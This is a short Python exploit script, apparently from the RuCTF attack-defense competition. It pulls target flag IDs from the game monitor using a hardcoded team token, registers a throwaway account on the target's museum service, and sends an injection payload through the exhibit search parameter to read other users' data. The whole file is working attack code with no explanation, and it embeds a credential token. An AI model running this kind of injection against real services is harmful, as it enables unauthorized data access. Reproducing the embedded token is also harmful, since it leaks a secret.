#!/usr/bin/env python3
import sys
import requests
import jwt
import ast
import string
import random

host = sys.argv[1]

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def get_id(host):
    headers = {
    'X-Team-Token': 'CLOUD_27_fccf28fc5ad2afc6eb2c33cdc9f9d0c5',
    }
    params = {
    'service': "5",
    }
    dataJson = requests.get('https://monitor.ructf.org/flag_ids', params=params, headers=headers).json()
    for i in range(1,35):
        if dataJson['flag_ids'][str(i)]['host'] == host:
            return dataJson['flag_ids'][str(i)]['flag_ids']

user = get_random_string(8)

ids = get_id(host)

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': f'http://{host}:6969/',
    'Content-Type': 'application/json',
    'Origin': f'http://{host}:6969',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

json_data = {
    'name': f'{user}',
    'password': f'{user}',
}

response = requests.post(f'http://{host}:6969/api/register', headers=headers, json=json_data)


token = ast.literal_eval(response.text)

token = token['token']

print(token)


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': f'http://{host}:6969/',
    'token': f'{token}',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}
for id in ids:

    id = ast.literal_eval(id)['museum_id']
    print(type(id))
    response = requests.get(
    f'http://{host}:6969/api/museum/exhibits?search=%27+OR+1%3D1)+AT+DATABASE+({id}))%27',
    headers=headers,
    )
    print(response.text, flush=True)
